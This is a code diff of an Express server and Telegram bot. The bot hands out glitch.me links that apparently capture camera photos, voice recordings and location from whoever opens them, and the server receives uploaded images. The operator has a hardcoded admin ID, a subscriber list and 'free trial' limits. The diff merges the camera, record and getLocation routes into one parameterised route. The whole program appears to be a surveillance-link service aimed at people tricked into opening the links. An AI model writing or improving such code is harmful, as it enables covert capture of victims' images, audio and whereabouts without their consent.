@@ -12,6 +12,7 @@ const app = express();
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
+
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 const MAX_FREE_ATTEMPTS = 3;
@@ -22,58 +23,53 @@ const adminId = '7130416076';
 const subscribedUsers = new Set();
 
 // Camera routes
-app.get('/:userId', (req, res) => {
+app.get('/:action/:userId', (req, res) => {
     const userId = req.params.userId;
+    const action = req.params.action;
     const cameraType = req.query.cameraType;
-
-    if (subscribedUsers.has(userId)) {
-        res.sendFile(path.join(__dirname, 'location.html'));
-        return;
-    }
-
-    if (!userVisits[userId]) {
-        userVisits[userId] = { frontCamera: 0, rearCamera: 0, voiceRecord: 0 };
-    }
-
-    userVisits[userId][cameraType === 'front' ? 'frontCamera' : 'rearCamera']++;
-
-    if (userVisits[userId][cameraType === 'front' ? 'frontCamera' : 'rearCamera'] > MAX_FREE_ATTEMPTS) {
-        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
-        return;
-    }
-
-    res.sendFile(path.join(__dirname, 'location.html'));
-});
-
-// Voice recording routes
-
-// Endpoint to serve SJGD.html for /getLocation
-app.get('/getLocation', (req, res) => {
-    res.sendFile(path.join(__dirname, 'SJGD.html'));
-});
-
-// Endpoint to handle /record/:userId
-app.get('/record/:userId', (req, res) => {
-    const userId = req.params.userId;
     const duration = req.query.duration;
 
     if (subscribedUsers.has(userId)) {
-        res.sendFile(path.join(__dirname, 'record.html'));
+        switch(action) {
+            case 'camera':
+                res.sendFile(path.join(__dirname, 'location.html'));
+                break;
+            case 'record':
+                res.sendFile(path.join(__dirname, 'record.html'));
+                break;
+            case 'getLocation':
+                res.sendFile(path.join(__dirname, 'SJGD.html'));
+                break;
+            default:
+                res.status(404).send('Action not found');
+        }
         return;
     }
 
     if (!userVisits[userId]) {
-        userVisits[userId] = { frontCamera: 0, rearCamera: 0, voiceRecord: 0 };
+        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
     }
 
-    userVisits[userId].voiceRecord++;
+    userVisits[userId][action]++;
 
-    if (userVisits[userId].voiceRecord > MAX_FREE_ATTEMPTS) {
+    if (userVisits[userId][action] > MAX_FREE_ATTEMPTS) {
         res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
         return;
     }
 
-    res.sendFile(path.join(__dirname, 'record.html'));
+    switch(action) {
+        case 'camera':
+            res.sendFile(path.join(__dirname, 'location.html'));
+            break;
+        case 'record':
+            res.sendFile(path.join(__dirname, 'record.html'));
+            break;
+        case 'getLocation':
+            res.sendFile(path.join(__dirname, 'SJGD.html'));
+            break;
+        default:
+            res.status(404).send('Action not found');
+    }
 });
 
 app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
@@ -228,12 +224,12 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://creative-marmalade-periwinkle.glitch.me/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+        const url = `https://creative-marmalade-periwinkle.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
         bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
     } else if (data === 'get_location') {
-        const url = `https://creative-marmalade-periwinkle.glitch.me/getLocation?chatId=${chatId}`;
+        const url = `https://creative-marmalade-periwinkle.glitch.me/getLocation/${chatId}`;
         bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`);
     }
 });
